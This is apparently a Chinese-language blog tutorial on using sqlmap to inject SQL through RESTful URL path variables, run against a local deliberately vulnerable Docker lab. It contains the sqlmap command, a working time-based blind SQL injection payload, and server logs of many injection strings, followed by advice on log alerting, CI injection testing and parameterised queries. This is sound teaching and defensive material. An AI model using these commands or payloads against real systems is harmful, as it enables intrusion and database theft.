---
date: "2020-12-02T00:00:00Z"
description: 使用 sqlmap 定点注入 restful API 接口
keywords: tools, sqlmap
tags:
- security
- tools
title: 使用 sqlmap 根据变量位置定点注入 restful api
---

# 使用 sqlmap 根据变量位置定点注入 restful api

sqlmap 是一款强劲自动化的 sql 注入工具， 使用 python 开发， 支持 `python 2/3`。

RESTful API 规则几乎是当前开发执行的默认规范。  


在 restful 接口中， 常常将变量位置放置在 url 中。 
例如 `http://127.0.0.1:8080/{user}/profile` ， 其中 `{user}` 就是变量，根据代码实现方式，可以等价于 `http://127.0.0.1:8080/profile?user={user}` 。

那么， 在对这类 restful 接口进行 sql 注入的时候，又该注意什么呢？ 
本文将通过实验， 进行简单介绍。

## 先说结论

在进行 restful 接口注入的时候， 需要在变量位置使用占位符， 通常为 `1*` 。

例如接口如下

+ 接口规则: `http://127.0.0.1:8080/{user}/profile` 
+ 实际使用: `http://127.0.0.1:8080/zhangsan/profile`
+ 注入规则: `http://127.0.0.1:8080/1*/profile`
    + 实际上， 可以简写为 `http://127.0.0.1:8080/1*`

## 准备工作

**扫描工具**

+ [`sqlmap`](http://sqlmap.org/)

**运行环境**

+ 数据库: `mysql 5.7`
+ 注入靶机: [`vulhub/sqli/restful` 
    + [代码实现 - github](https://github.com/tangx/vulhub/tree/master/cmd/sqli/restful)
    + `doslab/vulhub-sqli:latest` 镜像: `docker pull doslab/vulhub-sqli:latest`

## 搭建环境

这里使用 `docker-compose` 快速搭建环境

**docker-compose.yml**

```yaml
# docker-compose.yml

version: '3.1'
services:
  mysql:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_ROOT_PASSWORD: root123
  sqli:
    image: doslab/vulhub-sqli
    ports:
      - 8080:8080
```

```bash
# 启动
$ docker-compose up -d

# 查看启动状态
$ docker-compose ps

# 验证数据库是否初始化
$ curl http://127.0.0.1:8080/v1/admin/admin
## {"name":"admin","password":"admin"}
```

注意: 由于 mysql 初始化需要一定时间， 所以在 **vulhub-sqli** 启动时 **可能无法正常初始化数据库** 或 **无法正常启动** 。  此时使用 `docker-compose restart sqli` 或 `docker-compose up -d` 即可。


## sqlmap 注入

在 github 上 clone 代码到本地并安装依赖组件。 具体操作可以按照说明进行。 这里建议使用 `git clone` 方式， 一遍后续更新。


或者， 使用笔者预先做好的镜像 docker 镜像 `docker pull tangx/sqlmap` 。

这里， 笔者使用 docker 进行注入操作

```bash
# 启动运行 sqlmap 环境
$ docker run --rm -it tangx/sqlmap:latest bash
```

在 `vulhub-sqli` 靶机中的 API `GET http://your-ip:8080/v0/${user}/${password}` 中有两个变量 **user** 和 **password** 。 任意使用其中给一个，均可完成注入。

这里我们在变量 **password** 的位置使用占位符 `1*`。

```bash
$ ./sqlmap.py -u "http://yourip:8080/v0/admin/1*" --batch

[19:00:42] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://192.168.233.3:8080/v0/admin/1' AND (SELECT 5249 FROM (SELECT(SLEEP(5)))xozz) AND 'oVDy'='oVDy
---
[19:00:57] [INFO] the back-end DBMS is MySQL
[19:00:57] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
back-end DBMS: MySQL >= 5.0.12
[19:00:57] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 1 times
[19:00:57] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.233.3'


```


从日志结果我们可以看到 `Type: time-based blind`，靶机有 **时间盲注** 漏洞。

## 运维体系加固

首先，我们观察一下 sqlmap 留下的日志。

接口部分日志如下

```log

[GIN] 2020/12/02 - 19:00:31 | 200 |     456.835µs |    192.168.32.1 | GET      "/v0/admin/1'sHvusK<'\">DyNhdx"
[GIN] 2020/12/02 - 19:00:31 | 200 |     474.341µs |    192.168.32.1 | GET      "/v0/admin/1) AND 5498=7607 AND (9169=9169"
[GIN] 2020/12/02 - 19:00:31 | 200 |     467.909µs |    192.168.32.1 | GET      "/v0/admin/1 AND 1526=1615"

... lue ...

[GIN] 2020/12/02 - 19:00:31 | 200 |     471.358µs |    192.168.32.1 | GET      "/v0/admin/1' AND EXTRACTVALUE(1745,CONCAT(0x5c,0x716b7a7171,(SELECT (ELT(1745=1745,1))),0x7178706271)) AND 'Sdog'='Sdog"
[GIN] 2020/12/02 - 19:00:31 | 200 |     311.095µs |    192.168.32.1 | GET      "/v0/admin/1 AND EXTRACTVALUE(1745,CONCAT(0x5c,0x716b7a7171,(SELECT (ELT(1745=1745,1))),0x7178706271))-- PuIi"

... lue ...

[GIN] 2020/12/02 - 19:00:42 | 200 |     390.044µs |    192.168.32.1 | GET      "/v0/admin/1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
time="2020-12-02T19:00:42Z" level=error msg="get user failed: Error 1222: The used SELECT statements have a different number of columns"
[GIN] 2020/12/02 - 19:00:42 | 200 |     371.442µs |    192.168.32.1 | GET      "/v0/admin/1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"

... lue ...

[GIN] 2020/12/02 - 19:00:57 | 200 |     445.171µs |    192.168.32.1 | GET      "/v0/admin/1' AND (SELECT 6597 FROM (SELECT(SLEEP(5-(IF(@@VERSION_COMMENT LIKE 0x256472697a7a6c6525,0,5)))))QvWg) AND 'ftQy'='ftQy"
[GIN] 2020/12/02 - 19:00:57 | 200 |     369.366µs |    192.168.32.1 | GET      "/v0/admin/1' AND (SELECT 5784 FROM (SELECT(SLEEP(5-(IF(@@VERSION_COMMENT LIKE 0x25506572636f6e6125,0,5)))))pKCS) AND 'WJHr'='WJHr"
time="2020-12-02T19:00:57Z" level=error msg="get user failed: Error 1305: FUNCTION vulhub.AURORA_VERSION does not exist"

... lue ...

```

通过日志不难看出， sqlmap 在测试注入的时候， 使用了各种类型的数据库函数。 因此， **可以完善日志系统， 针对异常接口参数进行及时告警和跟进处理** 。

当然， 如果真被 sql 注入拖库了， 那之后的优化也封堵也不过是亡羊补牢。 所以， 更好的办法是 **在 CI 完成发布到测试环境之后立即进行注入测试** ， 将事故扼杀在萌芽中。

## 补充

`doslab/vulhub-sqli` 额外提供了**同样功能，但无注入危险**的一个接口 `GET http://your-ip:8080/v1/{user}/{password}` ( **注意这里是 `v1`** ) 。
不通的是，该接口查询使用的时候 `golang mysql` 库进行的 `Query` 查询操作； 而非自己拼写 sql 语句。
